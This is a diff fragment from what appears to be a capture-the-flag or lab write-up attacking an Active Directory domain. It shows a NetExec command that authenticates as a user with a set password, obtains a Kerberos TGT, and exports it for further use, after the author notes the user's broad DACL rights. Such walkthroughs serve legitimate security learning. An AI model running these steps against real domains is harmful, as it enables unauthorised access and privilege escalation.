@@ -584,3 +584,23 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 ```
 
 Ill read the DACL info, and i notice something, the user `caleb.turner` has all the rights to move the objects 
+
+```python
+nxc smb dc.hsm-defense.local -u caleb.turner -p '//newpassword123' -k --generate-tgt caleb.turner
+SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\caleb.turner://newpassword123 
+SMB         dc.hsm-defense.local 445    dc               [+] TGT saved to: caleb.turner.ccache
+SMB         dc.hsm-defense.local 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=caleb.turner.ccache
+```
+
+Ill get a TGT
+
+```python
+export KRB5CCNAME=caleb.turner.ccache
+```
+
+Ill then export it
+
+```python
+
+```
